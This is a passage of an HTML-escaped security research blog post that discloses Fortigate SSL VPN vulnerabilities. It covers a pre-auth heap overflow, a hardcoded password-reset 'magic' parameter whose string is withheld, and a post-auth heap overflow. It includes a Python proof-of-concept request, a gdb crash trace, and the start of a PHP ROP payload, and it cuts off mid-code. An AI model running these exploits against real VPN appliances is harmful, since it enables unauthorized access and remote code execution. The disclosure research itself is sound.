class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;&amp;gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;&amp;amp;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;#&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;However, there is an inconsistency between length calculation and encoding process. The encode part does not handle that much.&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;&amp;lt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;#60;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;&amp;gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If we input a malicious string like &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;#&amp;lt;&amp;lt;&amp;lt;;&lt;/code&gt;, the &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;&lt;/code&gt; is still encoded into &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;#60;&lt;/code&gt;, so the result should be &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;#&amp;amp;#60;&amp;amp;#60;&amp;amp;#60;;&lt;/code&gt;! This is much longer than the expected length 6 bytes, so it leads to a heap overflow.&lt;/p&gt;

&lt;p&gt;PoC:&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&#39;title&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;x&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
    &lt;span class=&quot;s&quot;&gt;&#39;msg&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;&amp;amp;#&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;&amp;lt;&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;;&amp;lt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;https://sslvpn:4433/message&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;cve-2018-13382-the-magic-backdoor&quot;&gt;&lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-389&quot;&gt;CVE-2018-13382&lt;/a&gt;: The magic backdoor&lt;/h3&gt;
&lt;p&gt;In the login page, we found a special parameter called &lt;code class=&quot;highlighter-rouge&quot;&gt;magic&lt;/code&gt;. Once the parameter meets a hardcoded string, we can modify any user’s password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;According to our survey, there are still plenty of Fortigate SSL VPN lack of patch. Therefore, considering its severity, we will not disclose the magic string. However, this vulnerability has been &lt;a href=&quot;https://twitter.com/codewhitesec/status/1145967317672714240&quot;&gt;reproduced by the researcher from CodeWhite&lt;/a&gt;. It is surely that other attackers will exploit this vulnerability soon! Please update your Fortigate ASAP!&lt;/p&gt;

&lt;blockquote class=&quot;twitter-tweet&quot; data-lang=&quot;zh-tw&quot;&gt;&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;Critical vulns in &lt;a href=&quot;https://twitter.com/hashtag/FortiOS?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#FortiOS&lt;/a&gt; reversed &amp;amp; exploited by our colleagues &lt;a href=&quot;https://twitter.com/niph_?ref_src=twsrc%5Etfw&quot;&gt;@niph_&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/ramoliks?ref_src=twsrc%5Etfw&quot;&gt;@ramoliks&lt;/a&gt; - patch your &lt;a href=&quot;https://twitter.com/hashtag/FortiOS?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#FortiOS&lt;/a&gt; asap and see the &lt;a href=&quot;https://twitter.com/hashtag/bh2019?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#bh2019&lt;/a&gt; talk of &lt;a href=&quot;https://twitter.com/orange_8361?ref_src=twsrc%5Etfw&quot;&gt;@orange_8361&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/mehqq_?ref_src=twsrc%5Etfw&quot;&gt;@mehqq_&lt;/a&gt; for details (tnx guys for the teaser that got us started) &lt;a href=&quot;https://t.co/TLLEbXKnJ4&quot;&gt;pic.twitter.com/TLLEbXKnJ4&lt;/a&gt;&lt;/p&gt;&amp;mdash; Code White GmbH (@codewhitesec) &lt;a href=&quot;https://twitter.com/codewhitesec/status/1145967317672714240?ref_src=twsrc%5Etfw&quot;&gt;2019年7月2日&lt;/a&gt;&lt;/blockquote&gt;
&lt;script async=&quot;&quot; src=&quot;https://platform.twitter.com/widgets.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;

&lt;h3 id=&quot;cve-2018-13383-post-auth-heap-overflow&quot;&gt;&lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-388&quot;&gt;CVE-2018-13383&lt;/a&gt;: Post-auth heap overflow&lt;/h3&gt;

&lt;p&gt;This is a vulnerability on the WebVPN feature. While parsing JavaScript in the HTML, it tries to copy content into a buffer with the following code:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;js_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;js_buf_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The buffer size is fixed to &lt;code class=&quot;highlighter-rouge&quot;&gt;0x2000&lt;/code&gt;, but the input string is unlimited. Therefore, here is a heap overflow. It is worth to note that this vulnerability can overflow Null byte, which is useful in our exploitation.&lt;br /&gt;
To trigger this overflow, we need to put our exploit on an HTTP server, and then ask the SSL VPN to proxy our exploit as a normal user.&lt;/p&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;

&lt;p&gt;The official advisory described no RCE risk at first. Actually, it was a misunderstanding. We will show you how to exploit from the user login interface without authentication.&lt;/p&gt;

&lt;h3 id=&quot;cve-2018-13381&quot;&gt;CVE-2018-13381&lt;/h3&gt;
&lt;p&gt;Our first attempt is exploiting the pre-auth heap overflow. However, there is a fundamental defect of this vulnerability – It does not overflow Null bytes. In general, this is not a serious problem. The heap exploitation techniques nowadays should overcome this. However, we found it a disaster doing heap feng shui on Fortigate. There are several obstacles, making the heap unstable and hard to be controlled.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Single thread, single process, single allocator&lt;br /&gt;
  The web daemon handles multiple connection with &lt;code class=&quot;highlighter-rouge&quot;&gt;epoll()&lt;/code&gt;, no multi-process or multi-thread, and the main process and libraries use the same heap, called JeMalloc. It means, all the memory allocations from all the operations of all the connections are on the same heap. Therefore, the heap is really messy.&lt;/li&gt;
  &lt;li&gt;Operations regularly triggered&lt;br /&gt;
  This interferes the heap but is uncontrollable. We cannot arrange the heap carefully because it would be destroyed.&lt;/li&gt;
  &lt;li&gt;Apache additional memory management. &lt;br /&gt;
  The memory won’t be &lt;code class=&quot;highlighter-rouge&quot;&gt;free()&lt;/code&gt; until the connection ends. We cannot arrange the heap in a single connection. Actually this can be an effective mitigation for heap vulnerabilities especially for use-after-free.&lt;/li&gt;
  &lt;li&gt;JeMalloc&lt;br /&gt;
  JeMalloc isolates meta data and user data, so it is hard to modify meta data and play with the heap management. Moreover, it centralizes small objects, which also limits our exploit.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We were stuck here, and then we chose to try another way. If anyone exploits this successfully, please teach us!&lt;/p&gt;

&lt;h3 id=&quot;cve-2018-13379--cve-2018-13383&quot;&gt;CVE-2018-13379 + CVE-2018-13383&lt;/h3&gt;
&lt;p&gt;This is a combination of pre-auth file reading and post-auth heap overflow. One for gaining authentication and one for getting a shell.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Gain authentication&lt;br /&gt;
  We first use CVE-2018-13379 to leak the session file. The session file contains valuable information, such as username and plaintext password, which let us login easily.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Get the shell&lt;br /&gt;
  After login, we can ask the SSL VPN to proxy the exploit on our malicious HTTP server, and then trigger the heap overflow.&lt;/p&gt;

    &lt;p&gt;Due to the problems mentioned above, we need a nice target to overflow. We cannot control the heap carefully, but maybe we can find something &lt;strong&gt;regularly&lt;/strong&gt; appears! It would be great if it is &lt;strong&gt;everywhere&lt;/strong&gt;, and every time we trigger the bug, we can overflow it easily! However, it is a hard work to find such a target from this huge program, so we were stuck at that time … and we started to fuzz the server, trying to get something useful.&lt;/p&gt;

    &lt;p&gt;We got an interesting crash. To our great surprise, we almost control the program counter!&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;Here is the crash, and that’s why we love fuzzing! ;)&lt;/p&gt;
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  Program received signal SIGSEGV, Segmentation fault.
  0x00007fb908d12a77 in SSL_do_handshake () from /fortidev4-x86_64/lib/libssl.so.1.1
  2: /x $rax = 0x41414141
  1: x/i $pc
  =&amp;gt; 0x7fb908d12a77 &amp;lt;SSL_do_handshake+23&amp;gt;: callq *0x60(%rax)
  (gdb)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;The crash happened in &lt;a href=&quot;https://github.com/openssl/openssl/blob/master/ssl/ssl_lib.c#L3716&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SSL_do_handshake()&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SSL_do_handshake&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SSL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;

      &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ssl_renegotiate_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SSL_in_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SSL_in_before&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SSL_MODE_ASYNC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ASYNC_get_current_job&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
              &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssl_async_args&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

              &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

              &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssl_start_async_job&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssl_do_handshake_intern&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
              &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handshake_func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
    &lt;p&gt;We overwrote the function table inside &lt;a href=&quot;https://github.com/openssl/openssl/blob/master/ssl/ssl_locl.h#L1080&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;struct SSL&lt;/code&gt;&lt;/a&gt; called &lt;a href=&quot;https://github.com/openssl/openssl/blob/master/ssl/ssl_locl.h#L1087&quot;&gt;method&lt;/a&gt;, so when the program trying to execute &lt;code class=&quot;highlighter-rouge&quot;&gt;s-&amp;gt;method-&amp;gt;ssl_renegotiate_check(s, 0);&lt;/code&gt;, it crashed.&lt;/p&gt;

    &lt;p&gt;This is actually an ideal target of our exploit! The allocation of &lt;code class=&quot;highlighter-rouge&quot;&gt;struct SSL&lt;/code&gt; can be triggered easily, and the size is just close to our JaveScript buffer, so it can be nearby our buffer with a regular offset! According to the code, we can see that &lt;code class=&quot;highlighter-rouge&quot;&gt;ret = s-&amp;gt;handshake_func(s);&lt;/code&gt; calls a function pointer, which a perfect choice to control the program flow. With this finding, our exploit strategy is clear.&lt;/p&gt;

    &lt;p&gt;We first &lt;strong&gt;spray&lt;/strong&gt; the heap with SSL structure with lots of normal requests, and then overflow the SSL structure.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;Here we put our php PoC on an HTTP server:&lt;/p&gt;
    &lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;nv&quot;&gt;$low&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;nv&quot;&gt;$high&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;II&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$low&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$high&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4141414141414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$nop_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x32FC078&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$junk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$nop_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$junk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x110FA1A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// # start here # pop r13 ; pop r14 ; pop rbp ; ret ;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$junk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
